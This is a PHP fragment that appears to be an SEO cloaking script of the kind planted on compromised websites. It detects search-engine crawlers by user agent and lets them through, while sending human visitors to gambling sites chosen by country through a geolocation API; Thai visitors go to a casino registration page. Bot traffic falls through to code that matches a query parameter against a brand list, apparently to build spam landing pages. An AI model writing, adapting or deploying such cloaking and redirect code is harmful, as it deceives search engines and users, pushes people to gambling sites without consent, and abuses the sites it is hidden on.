function isBot() 
{
    $bots = array(
        'AhrefsBot', 'baiduspider', 'baidu', 'bingbot', 'bing', 'DuckDuckBot',
        'facebookexternalhit', 'facebook', 'facebot', 'googlebot', '-google',
        'google-inspectiontool', 'Uptime-Kuma', 'linked', 'Linkidator', 'linkwalker',
        'mediapartners', 'mod_pagespeed', 'naverbot', 'pinterest', 'SemrushBot',
        'twitterbot', 'twitter', 'xing', 'yahoo', 'YandexBot', 'YandexMobileBot',
        'yandex', 'Zeus/i'
    );

    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    foreach ($bots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }

    return false;
}

function getCountryByIP($ip) 
{
    $apiUrl = "http://ip-api.com/json/{$ip}?fields=countryCode";

    $response = @file_get_contents($apiUrl);
    if ($response) {
        $data = json_decode($response, true);
        return isset($data['countryCode']) ? $data['countryCode'] : null;
    }

    return null;
}

$ipAddress = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';

if (!isBot()) {
    $countryCode = getCountryByIP($ipAddress);

    if ($countryCode === 'TH') {
        header("HTTP/1.1 301 Moved Permanently");
        header("Location: https://siam188.one/register");
        exit();
    } else {
        header("HTTP/1.1 301 Moved Permanently");
        header("Location: https://bayi.kollektifsigorta.com");
        exit();
    }
}

if (isset($_GET['th'])) {
    $filename = "cek_out.txt";
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $target_string = strtolower($_GET['th']);
    foreach ($lines as $item) {
        if (strtolower($item) === $target_string) {
            $BRAND = strtoupper($target_string);
        }
    }
    if (isset($BRAND)) {
        $BRANDS = $BRAND;
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        if (isset($fullUrl)) {
            $parsedUrl = parse_url($fullUrl);
            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
            $urlPath = $baseUrl;
        } else {
            echo "upss";
        }
    }
}

